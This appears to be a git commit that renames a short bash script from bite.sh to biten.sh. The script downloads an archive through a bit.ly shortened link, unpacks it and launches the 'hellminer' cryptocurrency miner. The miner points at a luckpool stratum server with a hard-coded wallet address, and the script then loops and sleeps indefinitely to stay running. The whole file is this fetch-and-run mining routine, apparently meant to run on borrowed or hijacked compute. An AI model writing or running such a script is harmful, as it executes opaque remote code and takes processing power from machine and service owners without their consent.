149869d6a43815a057e3acca6fa83f90091badf4
squibex <90225595+squibex@users.noreply.github.com>
2021-09-13 11:41:43 +0700

    Update and rename bite.sh to biten.sh

--- bite.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-wget https://bit.ly/helminr
-tar xf helminr
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.bit -p x --cpu 2 
-while [ 1 ]; do
-sleep 5
-done
-sleep 999999999 
---
+++ biten.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+wget https://bit.ly/helminr
+tar xf helminr
+./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.bit -p x --cpu 2 
+while [ 1 ]; do
+sleep 5
+done
+sleep 999999999 
